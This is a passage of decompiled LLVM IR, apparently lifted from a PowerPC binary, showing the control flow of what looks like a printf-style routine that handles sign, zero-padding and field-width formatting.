  %v1_10005ba4 = mul i32 %v0_10005ba4, 4
  store i32 %v1_10005ba4, i32* %r0.global-to-local, align 4
  %v0_10005ba8 = load i32, i32* @r1, align 4
  %v2_10005ba8 = add i32 %v0_10005ba8, %v1_10005ba4
  %v1_10005bac = add i32 %v2_10005ba8, 188
  %v2_10005bac = inttoptr i32 %v1_10005bac to i32*
  %v3_10005bac = load i32, i32* %v2_10005bac, align 4
  store i32 %v3_10005bac, i32* %r0.global-to-local, align 4
  %v1_10005bb0 = call i32 @__asm_rlwinm(i32 %v3_10005bac, i32 0, i32 20, i32 23)
  br label %dec_label_pc_10005bb4

dec_label_pc_10005bb4:                            ; preds = %dec_label_pc_10005b98, %dec_label_pc_10005ba4
  %v3_10005bb4 = load i32, i32* %stack_var_-344, align 4
  %v0_10005bb8 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10005bb8, i32* @r5, align 4
  %v2_10005bbc = inttoptr i32 %v0_10005bb8 to i32*
  %v3_10005bbc = call i32 @function_10009fb0(i32 %v3_10005bb4, i32* %v2_10005bbc)
  store i32 %v0_10005bb8, i32* %r7.global-to-local, align 4
  %v0_10005bcc = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10005bcc, i32* %r8.global-to-local, align 4
  %v6_10005bd4 = call i32 @function_1000a06c(i8* %v5_10005bd4, i32 %v3_10005bbc, i32 %v3_10005bb4, i32 %v0_10005bb8, i32 %v0_10005bcc)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_10005bd4, i32* %r30.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_10005c28, label %dec_label_pc_10005be8

dec_label_pc_10005be8:                            ; preds = %dec_label_pc_10005bb4
  %v7_10005bd4 = inttoptr i32 %v6_10005bd4 to i8*
  %v3_10005be8 = load i8, i8* %v7_10005bd4, align 1
  %v4_10005be8 = zext i8 %v3_10005be8 to i32
  store i32 %v4_10005be8, i32* %r0.global-to-local, align 4
  %v3_10005bf0 = icmp eq i8 %v3_10005be8, 45
  br i1 %v3_10005bf0, label %dec_label_pc_10005bf8, label %dec_label_pc_10005c0c

dec_label_pc_10005bf8:                            ; preds = %dec_label_pc_10005be8
  %v1_10005bf8 = or i32 %v0_10005c1c, 2
  store i32 %v1_10005bf8, i32* %r0.global-to-local, align 4
  %v2_10005bfc = add i32 %v6_10005bd4, 1
  store i32 %v2_10005bfc, i32* %r30.global-to-local, align 4
  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_10005c28

dec_label_pc_10005c0c:                            ; preds = %dec_label_pc_10005be8
  %v1_10005c0c = and i32 %v0_10005c1c, 2
  store i32 %v1_10005c0c, i32* %r0.global-to-local, align 4
  %v3_10005c0c = icmp eq i32 %v1_10005c0c, 0
  br i1 %v3_10005c0c, label %dec_label_pc_10005c1c, label %dec_label_pc_10005c14

dec_label_pc_10005c14:                            ; preds = %dec_label_pc_10005c0c
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_10005c28

dec_label_pc_10005c1c:                            ; preds = %dec_label_pc_10005c0c
  %v1_10005c1c = urem i32 %v0_10005c1c, 2
  store i32 %v1_10005c1c, i32* %r11.global-to-local, align 4
  %v3_10005c1c = icmp eq i32 %v1_10005c1c, 0
  br i1 %v3_10005c1c, label %dec_label_pc_10005c28, label %dec_label_pc_10005c24

dec_label_pc_10005c24:                            ; preds = %dec_label_pc_10005c1c
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_10005c28

dec_label_pc_10005c28:                            ; preds = %dec_label_pc_10005c1c, %dec_label_pc_10005bb4, %dec_label_pc_10005c14, %dec_label_pc_10005bf8, %dec_label_pc_10005c24
  %v0_10005c94 = phi i32 [ %v6_10005bd4, %dec_label_pc_10005bb4 ], [ %v2_10005bfc, %dec_label_pc_10005bf8 ], [ %v6_10005bd4, %dec_label_pc_10005c1c ], [ %v6_10005bd4, %dec_label_pc_10005c24 ], [ %v6_10005bd4, %dec_label_pc_10005c14 ]
  %stack_var_-184.0 = phi i32 [ %v0_10005c1c, %dec_label_pc_10005bb4 ], [ %v1_10005bf8, %dec_label_pc_10005bf8 ], [ %v0_10005c1c, %dec_label_pc_10005c1c ], [ %v0_10005c1c, %dec_label_pc_10005c24 ], [ %v0_10005c1c, %dec_label_pc_10005c14 ]
  %v3_10005c28 = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_10005e3c, i32* %r0.global-to-local, align 4
  %v2_10005c30 = sub i32 %v2_10005e3c, %v0_10005c94
  %v1_10005c38 = add i32 %v2_10005c30, 127
  store i32 %v1_10005c38, i32* %r31.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_10005c28, -1
  br i1 %tmp76, label %dec_label_pc_10005c44, label %dec_label_pc_10005c40

dec_label_pc_10005c40:                            ; preds = %dec_label_pc_10005c28
  br label %dec_label_pc_10005c44

dec_label_pc_10005c44:                            ; preds = %dec_label_pc_10005c28, %dec_label_pc_10005c40
  %v0_10005c78 = phi i32 [ %v3_10005c28, %dec_label_pc_10005c28 ], [ 1, %dec_label_pc_10005c40 ]
  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_10005c48 = and i32 %stack_var_-184.0, 16
  store i32 %v1_10005c48, i32* %r11.global-to-local, align 4
  %v3_10005c48 = icmp eq i32 %v1_10005c48, 0
  br i1 %v3_10005c48, label %dec_label_pc_10005c94, label %dec_label_pc_10005c50

dec_label_pc_10005c50:                            ; preds = %dec_label_pc_10005c44
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_10005c54, label %dec_label_pc_10005c60, label %dec_label_pc_10005c70.thread

dec_label_pc_10005c70.thread:                     ; preds = %dec_label_pc_10005c50
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_10005c94

dec_label_pc_10005c60:                            ; preds = %dec_label_pc_10005c50
  br i1 %v3_10005c60, label %dec_label_pc_10005c68, label %dec_label_pc_10005c70

dec_label_pc_10005c68:                            ; preds = %dec_label_pc_10005c60
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_10005c94

dec_label_pc_10005c70:                            ; preds = %dec_label_pc_10005c60
  br i1 %v3_10005c70, label %dec_label_pc_10005c78, label %dec_label_pc_10005c94

dec_label_pc_10005c78:                            ; preds = %dec_label_pc_10005c70
  %v3_10005c78 = icmp ugt i32 %v0_10005c78, %v1_10005c38
  br i1 %v3_10005c78, label %dec_label_pc_10005c94, label %dec_label_pc_10005c80

dec_label_pc_10005c80:                            ; preds = %dec_label_pc_10005c78
  %v1_10005c80 = inttoptr i32 %v0_10005c94 to i8*
  %v2_10005c80 = load i8, i8* %v1_10005c80, align 1
  %v3_10005c80 = zext i8 %v2_10005c80 to i32
  store i32 %v3_10005c80, i32* %r0.global-to-local, align 4
  %v3_10005c88 = icmp eq i8 %v2_10005c80, 48
  br i1 %v3_10005c88, label %dec_label_pc_10005c94, label %dec_label_pc_10005c90

dec_label_pc_10005c90:                            ; preds = %dec_label_pc_10005c80
  %v1_10005c90 = add i32 %v2_10005c30, 128
  br label %dec_label_pc_10005c94

dec_label_pc_10005c94:                            ; preds = %dec_label_pc_10005c70.thread, %dec_label_pc_10005c70, %dec_label_pc_10005c80, %dec_label_pc_10005c78, %dec_label_pc_10005c44, %dec_label_pc_10005c68, %dec_label_pc_10005c90
  %v1_10005cdc = phi i32 [ %v0_10005c78, %dec_label_pc_10005c70 ], [ 1, %dec_label_pc_10005c80 ], [ %v0_10005c78, %dec_label_pc_10005c78 ], [ %v0_10005c78, %dec_label_pc_10005c44 ], [ %v0_10005c78, %dec_label_pc_10005c68 ], [ %v1_10005c90, %dec_label_pc_10005c90 ], [ %v0_10005c78, %dec_label_pc_10005c70.thread ]
  %v1_10005c94 = inttoptr i32 %v0_10005c94 to i8*
  %v2_10005c94 = load i8, i8* %v1_10005c94, align 1
  %v3_10005c94 = zext i8 %v2_10005c94 to i32
  store i32 %v3_10005c94, i32* %r0.global-to-local, align 4
  %v3_10005c98 = icmp eq i8 %v2_10005c94, 48
  br i1 %v3_10005c98, label %dec_label_pc_10005ca0, label %dec_label_pc_10005cd8

dec_label_pc_10005ca0:                            ; preds = %dec_label_pc_10005c94
  %v0_10005ca0 = load i32, i32* @r27, align 4
  %tmp77 = icmp slt i32 %v0_10005ca0, 6
  br i1 %tmp77, label %dec_label_pc_10005cac, label %dec_label_pc_10005ca8

dec_label_pc_10005ca8:                            ; preds = %dec_label_pc_10005ca0
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_10005cac

dec_label_pc_10005cac:                            ; preds = %dec_label_pc_10005ca0, %dec_label_pc_10005ca8
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_10005cb0, label %dec_label_pc_10005cb8, label %dec_label_pc_10005cc8

dec_label_pc_10005cb8:                            ; preds = %dec_label_pc_10005cac
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1000e5c8.235 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005e54

dec_label_pc_10005cc8:                            ; preds = %dec_label_pc_10005cac
  %v3_10005cc8 = icmp eq i32 %v1_10005cdc, 0
  br i1 %v3_10005cc8, label %dec_label_pc_10005cd0, label %dec_label_pc_10005cd8

dec_label_pc_10005cd0:                            ; preds = %dec_label_pc_10005cc8
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10005e54

dec_label_pc_10005cd8:                            ; preds = %dec_label_pc_10005cc8, %dec_label_pc_10005c94
  %v3_10005cd8 = icmp ugt i32 %v1_10005cdc, %v1_10005c38
  %v2_10005cdc = sub i32 %v1_10005cdc, %v1_10005c38
  store i32 %v2_10005cdc, i32* %r29.global-to-local, align 4
  br i1 %v3_10005cd8, label %dec_label_pc_10005e74thread-pre-split, label %dec_label_pc_10005e54

dec_label_pc_10005ce8:                            ; preds = %dec_label_pc_10005b08
  br i1 %v2_10005ce8, label %dec_label_pc_10005d1c, label %dec_label_pc_10005cf0

dec_label_pc_10005cf0:                            ; preds = %dec_label_pc_10005ce8
  %v3_10005cf0 = load i32, i32* %stack_var_-344, align 4
  %v0_10005cfc = load i32, i32* %r24.global-to-local, align 4
  store i32 268459276, i32* @lr, align 4
  %v5_10005d08 = call i32 @function_1000a164(i32 %v0_10005cfc, i32* nonnull %stack_var_-196, i32 268458212, i32 %v3_10005cf0)
  %v1_10005d0c = icmp slt i32 %v5_10005d08, 0
  br i1 %v1_10005d0c, label %dec_label_pc_10005fd8, label %dec_label_pc_10005d14

dec_label_pc_10005d14:                            ; preds = %dec_label_pc_10005cf0
  %v0_10005d14 = load i32, i32* %r23.global-to-local, align 4
  %v2_10005d14 = add i32 %v0_10005d14, %v5_10005d08
  store i32 %v2_10005d14, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_10005fc4

dec_label_pc_10005d1c:                            ; preds = %dec_label_pc_10005ce8
  br i1 %v2_10005d1c, label %dec_label_pc_10005dc4, label %dec_label_pc_10005d24

dec_label_pc_10005d24:                            ; preds = %dec_label_pc_10005d1c
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_10005d30 = load i32, i32* %stack_var_-344, align 4
  %v1_10005d38 = inttoptr i32 %v3_10005d30 to i32*
  %v2_10005d38 = load i32, i32* %v1_10005d38, align 4
  br i1 %v3_10005d1c, label %dec_label_pc_10005d38, label %dec_label_pc_10005d8c

dec_label_pc_10005d38:                            ; preds = %dec_label_pc_10005d24
  store i32 %v2_10005d38, i32* %r0.global-to-local, align 4
  %v3_10005d3c = icmp eq i32 %v2_10005d38, 0
  store i32 %v2_10005d38, i32* %stack_var_-340, align 4
  br i1 %v3_10005d3c, label %dec_label_pc_10005e5c, label %dec_label_pc_10005d48

dec_label_pc_10005d48:                            ; preds = %dec_label_pc_10005d38
  %v3_10005d48 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10005d48, i32* %r0.global-to-local, align 4
  %v1_10005d50 = icmp slt i32 %v3_10005d48, 0
  br i1 %v1_10005d50, label %dec_label_pc_10005d5c, label %dec_label_pc_10005d58

dec_label_pc_10005d58:                            ; preds = %dec_label_pc_10005d48
  br label %dec_label_pc_10005d5c

dec_label_pc_10005d5c:                            ; preds = %dec_label_pc_10005d48, %dec_label_pc_10005d58
  %storemerge94 = phi i32 [ %v3_10005d48, %dec_label_pc_10005d58 ], [ -1, %dec_label_pc_10005d48 ]
  store i32 %storemerge94, i32* @r5, align 4
  store i32 %v2_10005d5c, i32* @r3, align 4
  store i32 %v2_10005d60, i32* @r6, align 4
  store i32 %v2_10005d5c, i32* @r4, align 4
  store i32 268459372, i32* @lr, align 4
  %v0_10005d68 = call i32 @function_10009b2c()
  %v3_10005d6c = icmp eq i32 %v0_10005d68, -1
  store i32 %v0_10005d68, i32* @r31, align 4
  br i1 %v3_10005d6c, label %dec_label_pc_10005fd8, label %dec_label_pc_10005d78

dec_label_pc_10005d78:                            ; preds = %dec_label_pc_10005d5c
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005e74

dec_label_pc_10005d8c:                            ; preds = %dec_label_pc_10005d24
  store i32 %v2_10005e3c, i32* @r28, align 4
  store i32 268459424, i32* @lr, align 4
  %v3_10005d9c = call i32 @function_10009ad0(i32 %v2_10005e3c, i32 %v2_10005d38, i32 %v2_10005d60)
  %v3_10005da0 = icmp eq i32 %v3_10005d9c, -1
  store i32 %v3_10005d9c, i32* @r31, align 4
  br i1 %v3_10005da0, label %dec_label_pc_10005fd8, label %dec_label_pc_10005dac

dec_label_pc_10005dac:                            ; preds = %dec_label_pc_10005d8c
  store i32 %v2_10005e3c, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  %v0_10005dbc = load i32, i32* @r25, align 4
  %v1_10005dbc = load i32, i32* @r28, align 4
  %v3_10005dbc = trunc i32 %v0_10005dbc to i8
  %v4_10005dbc = add i32 %v1_10005dbc, %v3_10005d9c
  %v5_10005dbc = inttoptr i32 %v4_10005dbc to i8*
  store i8 %v3_10005dbc, i8* %v5_10005dbc, align 1
  %v0_10005e78.pre.pre = load i32, i32* @r31, align 4
  %v1_10005e78.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10005e74thread-pre-split

dec_label_pc_10005dc4:                            ; preds = %dec_label_pc_10005d1c
  br i1 %v2_10005dc4, label %dec_label_pc_10005e30, label %dec_label_pc_10005dcc

dec_label_pc_10005dcc:                            ; preds = %dec_label_pc_10005dc4
  %v3_10005dd0 = load i32, i32* %stack_var_-344, align 4
  %v1_10005dd8 = inttoptr i32 %v3_10005dd0 to i32*
  %v2_10005dd8 = load i32, i32* %v1_10005dd8, align 4
  br i1 %v3_10005dc4, label %dec_label_pc_10005dd8, label %dec_label_pc_10005e08

dec_label_pc_10005dd8:                            ; preds = %dec_label_pc_10005dcc
  store i32 %v2_10005dd8, i32* %r30.global-to-local, align 4
  %v3_10005ddc = icmp eq i32 %v2_10005dd8, 0
  br i1 %v3_10005ddc, label %dec_label_pc_10005e5c, label %dec_label_pc_10005de4

dec_label_pc_10005de4:                            ; preds = %dec_label_pc_10005dd8, %dec_label_pc_10005e38
  %v0_10005df8 = phi i32 [ %v2_10005dd8, %dec_label_pc_10005dd8 ], [ %v3_10005e48, %dec_label_pc_10005e38 ]
  %v3_10005de4 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10005de4, i32* %r0.global-to-local, align 4
  %v1_10005dec = icmp slt i32 %v3_10005de4, 0
  br i1 %v1_10005dec, label %dec_label_pc_10005df8, label %dec_label_pc_10005df4

dec_label_pc_10005df4:                            ; preds = %dec_label_pc_10005de4
  br label %dec_label_pc_10005df8

dec_label_pc_10005df8:                            ; preds = %dec_label_pc_10005de4, %dec_label_pc_10005df4
  %storemerge95 = phi i32 [ %v3_10005de4, %dec_label_pc_10005df4 ], [ -1, %dec_label_pc_10005de4 ]
  store i32 %storemerge95, i32* @r4, align 4
  store i32 268459520, i32* @lr, align 4
  %v1_10005dfc = inttoptr i32 %v0_10005df8 to i8*
  %v2_10005dfc = call i32 @function_100074d4(i8* %v1_10005dfc)
  store i32 %v2_10005dfc, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10005e68

dec_label_pc_10005e08:                            ; preds = %dec_label_pc_10005dcc
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 %v2_10005dd8, i32* %stack_var_-328, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_10005e3c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005e74thread-pre-split

dec_label_pc_10005e30:                            ; preds = %dec_label_pc_10005dc4
  br i1 %v3_10005e30, label %dec_label_pc_10005e38, label %dec_label_pc_10005fd8

dec_label_pc_10005e38:                            ; preds = %dec_label_pc_10005e30
  %v0_10005e38 = call i32 @function_10004e38()
  %v1_10005e40 = inttoptr i32 %v0_10005e38 to i32*
  %v2_10005e40 = load i32, i32* %v1_10005e40, align 4
  store i32 %v2_10005e40, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268459596, i32* @lr, align 4
  %v3_10005e48 = call i32 @function_100075c4(i32 %v2_10005e40, i32 %v2_10005e3c, i32 128)
  store i32 %v3_10005e48, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005de4

dec_label_pc_10005e54:                            ; preds = %dec_label_pc_10005cd8, %dec_label_pc_10005cd0, %dec_label_pc_10005cb8
  %v0_10005e78.pre41 = phi i32 [ %v1_10005c38, %dec_label_pc_10005cd8 ], [ 0, %dec_label_pc_10005cd0 ], [ 5, %dec_label_pc_10005cb8 ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10005e74thread-pre-split

dec_label_pc_10005e5c:                            ; preds = %dec_label_pc_10005dd8, %dec_label_pc_10005d38
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000e5d0.236 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005e68

dec_label_pc_10005e68:                            ; preds = %dec_label_pc_10005df8, %dec_label_pc_10005e5c
  %v0_10005e7829 = phi i32 [ %v2_10005dfc, %dec_label_pc_10005df8 ], [ 6, %dec_label_pc_10005e5c ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  br label %dec_label_pc_10005e74

dec_label_pc_10005e74thread-pre-split:            ; preds = %dec_label_pc_10005dac, %dec_label_pc_10005e08, %dec_label_pc_10005e54, %dec_label_pc_10005cd8
  %v1_10005e78.pre = phi i32 [ %v2_10005cdc, %dec_label_pc_10005cd8 ], [ 0, %dec_label_pc_10005e54 ], [ %v1_10005e78.pre.pre, %dec_label_pc_10005dac ], [ 0, %dec_label_pc_10005e08 ]
  %v0_10005e78.pre = phi i32 [ %v1_10005c38, %dec_label_pc_10005cd8 ], [ %v0_10005e78.pre41, %dec_label_pc_10005e54 ], [ %v0_10005e78.pre.pre, %dec_label_pc_10005dac ], [ 1, %dec_label_pc_10005e08 ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_10005cd8 ], [ %stack_var_-184.0, %dec_label_pc_10005e54 ], [ %v0_10005c1c, %dec_label_pc_10005dac ], [ %v0_10005c1c, %dec_label_pc_10005e08 ]
  %v0_10005e74.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_10005e74

dec_label_pc_10005e74:                            ; preds = %dec_label_pc_10005e74thread-pre-split, %dec_label_pc_10005d78, %dec_label_pc_10005e68
  %v1_10005e78 = phi i32 [ %v1_10005e78.pre, %dec_label_pc_10005e74thread-pre-split ], [ 0, %dec_label_pc_10005d78 ], [ 0, %dec_label_pc_10005e68 ]
  %v0_10005e78 = phi i32 [ %v0_10005e78.pre, %dec_label_pc_10005e74thread-pre-split ], [ %v0_10005d68, %dec_label_pc_10005d78 ], [ %v0_10005e7829, %dec_label_pc_10005e68 ]
  %v0_10005e80 = phi i32 [ %v0_10005e74.pr, %dec_label_pc_10005e74thread-pre-split ], [ 11, %dec_label_pc_10005d78 ], [ 11, %dec_label_pc_10005e68 ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_10005e74thread-pre-split ], [ %v0_10005c1c, %dec_label_pc_10005d78 ], [ %v0_10005c1c, %dec_label_pc_10005e68 ]
  %v3_10005e74 = icmp eq i32 %v0_10005e80, 11
  %v2_10005e78 = add i32 %v0_10005e78, %v1_10005e78
  store i32 %v2_10005e78, i32* %r0.global-to-local, align 4
  br i1 %v3_10005e74, label %dec_label_pc_10005e94, label %dec_label_pc_10005e80

dec_label_pc_10005e80:                            ; preds = %dec_label_pc_10005e74
  %v0_10005e84 = call i32 @__asm_mfcr()
  %v1_10005e88 = call i32 @__asm_rlwinm(i32 %v0_10005e84, i32 30, i32 31, i32 31)
  %v1_10005e8c = add i32 %v1_10005e88, 1
  %v0_10005e90 = load i32, i32* %r0.global-to-local, align 4
  %v2_10005e90 = add i32 %v0_10005e90, %v1_10005e8c
  store i32 %v2_10005e90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10005e94

dec_label_pc_10005e94:                            ; preds = %dec_label_pc_10005e74, %dec_label_pc_10005e80
  %v0_10005eac = phi i32 [ %v2_10005e78, %dec_label_pc_10005e74 ], [ %v2_10005e90, %dec_label_pc_10005e80 ]
  %v3_10005e9c = icmp ugt i32 %tmp, %v0_10005eac
  br i1 %v3_10005e9c, label %dec_label_pc_10005ea4, label %dec_label_pc_10005ea8

dec_label_pc_10005ea4:                            ; preds = %dec_label_pc_10005e94
  %v2_10005ea4 = sub i32 %tmp, %v0_10005eac
  br label %dec_label_pc_10005ea8

dec_label_pc_10005ea8:                            ; preds = %dec_label_pc_10005e94, %dec_label_pc_10005ea4
  %storemerge93 = phi i32 [ %v2_10005ea4, %dec_label_pc_10005ea4 ], [ 0, %dec_label_pc_10005e94 ]
  %v1_10005eb8 = phi i32 [ %v2_10005ea4, %dec_label_pc_10005ea4 ], [ 0, %dec_label_pc_10005e94 ]
  store i32 %storemerge93, i32* @r28, align 4
  %v0_10005ea8 = load i32, i32* @r26, align 4
  %v3_10005ea8 = icmp eq i32 %v0_10005ea8, 48
  %v2_10005eac = add i32 %v1_10005eb8, %v0_10005eac
  store i32 %v2_10005eac, i32* %r0.global-to-local, align 4
  %v0_10005eb0 = load i32, i32* %r23.global-to-local, align 4
  %v2_10005eb0 = add i32 %v0_10005eb0, %v2_10005eac
  store i32 %v2_10005eb0, i32* %r23.global-to-local, align 4
  br i1 %v3_10005ea8, label %dec_label_pc_10005eb8, label %dec_label_pc_10005ec0

dec_label_pc_10005eb8:                            ; preds = %dec_label_pc_10005ea8
  %v0_10005eb8 = load i32, i32* %r29.global-to-local, align 4
  %v2_10005eb8 = add i32 %v0_10005eb8, %v1_10005eb8
  store i32 %v2_10005eb8, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10005ec0

dec_label_pc_10005ec0:                            ; preds = %dec_label_pc_10005ea8, %dec_label_pc_10005eb8
  %v0_10005ed4 = phi i32 [ %v1_10005eb8, %dec_label_pc_10005ea8 ], [ 0, %dec_label_pc_10005eb8 ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_10005ec4 = and i32 %stack_var_-184.1, 8
  %v3_10005ec4 = icmp eq i32 %v1_10005ec4, 0
  br i1 %v3_10005ec4, label %dec_label_pc_10005ecc, label %dec_label_pc_10005ee8

dec_label_pc_10005ecc:                            ; preds = %dec_label_pc_10005ec0
  %v0_10005ecc = load i32, i32* %r24.global-to-local, align 4
  store i32 268459740, i32* @lr, align 4
  %v4_10005ed8 = call i32 @function_10005884(i32 %v0_10005ecc, i8 32, i32 %v0_10005ed4)
  %v1_10005edc = load i32, i32* @r28, align 4
  %v4_10005edc = icmp eq i32 %v4_10005ed8, %v1_10005edc
  br i1 %v4_10005edc, label %dec_label_pc_10005ee4, label %dec_label_pc_10005fd8

dec_label_pc_10005ee4:                            ; preds = %dec_label_pc_10005ecc
  br label %dec_label_pc_10005ee8

dec_label_pc_10005ee8:                            ; preds = %dec_label_pc_10005ec0, %dec_label_pc_10005ee4
  %v0_10005eec = load i32, i32* %r24.global-to-local, align 4
  %v0_10005ef4 = load i32, i32* @r27, align 4
  %v2_10005ef4 = add i32 %v0_10005ef4, ptrtoint (i32* @global_var_1000e5d8.237 to i32)
  store i32 268459772, i32* @lr, align 4
  %v2_10005ef8 = call i32 @function_10006ff4(i32 %v2_10005ef4, i32 %v0_10005eec)
  %v0_10005f04 = load i32, i32* @r29, align 4
  store i32 268459788, i32* @lr, align 4
  %v4_10005f08 = call i32 @function_10005884(i32 %v0_10005eec, i8 48, i32 %v0_10005f04)
  %v1_10005f0c = load i32, i32* @r29, align 4
  %v4_10005f0c = icmp eq i32 %v4_10005f08, %v1_10005f0c
  br i1 %v4_10005f0c, label %dec_label_pc_10005f14, label %dec_label_pc_10005fd8

dec_label_pc_10005f14:                            ; preds = %dec_label_pc_10005ee8
  %v3_10005f14 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_10005f14, i32* %r0.global-to-local, align 4
  %v3_10005f18 = icmp eq i32 %v3_10005f14, 0
  br i1 %v3_10005f18, label %dec_label_pc_10005f20, label %dec_label_pc_10005f48

dec_label_pc_10005f20:                            ; preds = %dec_label_pc_10005f14
  %v0_10005f20 = load i32, i32* @r31, align 4
  %v3_10005f20 = icmp eq i32 %v0_10005f20, 0
  br i1 %v3_10005f20, label %dec_label_pc_10005f3c.thread, label %dec_label_pc_10005f3c

dec_label_pc_10005f3c.thread:                     ; preds = %dec_label_pc_10005f20
  br label %dec_label_pc_10005fac

dec_label_pc_10005f3c:                            ; preds = %dec_label_pc_10005f20
  %v0_10005f2c = load i32, i32* @r30, align 4
  %v0_10005f34 = load i32, i32* %r24.global-to-local, align 4
  store i32 268459836, i32* @lr, align 4
  %v4_10005f38 = inttoptr i32 %v0_10005f34 to i16*
  %v5_10005f38 = call i32 @function_10009d4c(i32 %v0_10005f2c, i32 %v0_10005f20, i16* %v4_10005f38)
  %v1_10005f3c.pre = load i32, i32* @r31, align 4
  %v4_10005f3c = icmp eq i32 %v5_10005f38, %v1_10005f3c.pre
  br i1 %v4_10005f3c, label %dec_label_pc_10005fac, label %dec_label_pc_10005fd8

dec_label_pc_10005f48:                            ; preds = %dec_label_pc_10005f14
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_10005f8c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005f8c

dec_label_pc_10005f54:                            ; preds = %dec_label_pc_10005f8c
  %tmp78 = icmp ult i32 %v0_10005fa4, 129
  br i1 %tmp78, label %dec_label_pc_10005f5c, label %dec_label_pc_10005f58

dec_label_pc_10005f58:                            ; preds = %dec_label_pc_10005f54
  store i32 128, i32* @r5, align 4
  br label %dec_label_pc_10005f5c

dec_label_pc_10005f5c:                            ; preds = %dec_label_pc_10005f54, %dec_label_pc_10005f58
  store i32 ptrtoint (i32* @global_var_10005f60.238 to i32), i32* @lr, align 4
  %v0_10005f5c = call i32 @function_10009b2c()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_10005f5c, i32* @r30, align 4
  %v3_10005f64 = icmp eq i32 %v0_10005f5c, 0
  br i1 %v3_10005f64, label %dec_label_pc_10005f80, label %dec_label_pc_10005f78

dec_label_pc_10005f78:                            ; preds = %dec_label_pc_10005f5c
  %v0_10005f68 = load i32, i32* %r24.global-to-local, align 4
  store i32 268459900, i32* @lr, align 4
  %v3_10005f78 = inttoptr i32 %v0_10005f68 to i16*
  %v4_10005f78 = call i32 @function_10009d4c(i32 %v2_10005e3c, i32 %v0_10005f5c, i16* %v3_10005f78)
  store i32 %v4_10005f78, i32* %r0.global-to-local, align 4
  %v1_10005f80.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10005f80

dec_label_pc_10005f80:                            ; preds = %dec_label_pc_10005f5c, %dec_label_pc_10005f78
  %v1_10005f80 = phi i32 [ 0, %dec_label_pc_10005f5c ], [ %v1_10005f80.pre, %dec_label_pc_10005f78 ]
  %v0_10005f84 = phi i32 [ 0, %dec_label_pc_10005f5c ], [ %v4_10005f78, %dec_label_pc_10005f78 ]
  %v4_10005f80 = icmp eq i32 %v0_10005f84, %v1_10005f80
  %v1_10005f84 = load i32, i32* @r31, align 4
  %v2_10005f84 = sub i32 %v1_10005f84, %v0_10005f84
  store i32 %v2_10005f84, i32* @r31, align 4
  br i1 %v4_10005f80, label %dec_label_pc_10005f8c, label %dec_label_pc_10005fd8

dec_label_pc_10005f8c:                            ; preds = %dec_label_pc_10005f80, %dec_label_pc_10005f48
  %v0_10005fa4 = phi i32 [ %v2_10005f84, %dec_label_pc_10005f80 ], [ %v0_10005f8c.pre, %dec_label_pc_10005f48 ]
  %v3_10005f8c = icmp eq i32 %v0_10005fa4, 0
  store i32 %v2_10005e3c, i32* @r29, align 4
  store i32 %v2_10005d5c, i32* @r4, align 4
  store i32 %v2_10005d60, i32* @r6, align 4
  store i32 %v2_10005e3c, i32* @r3, align 4
  store i32 %v0_10005fa4, i32* @r5, align 4
  br i1 %v3_10005f8c, label %dec_label_pc_10005fac, label %dec_label_pc_10005f54

dec_label_pc_10005fac:                            ; preds = %dec_label_pc_10005f8c, %dec_label_pc_10005f3c.thread, %dec_label_pc_10005f3c
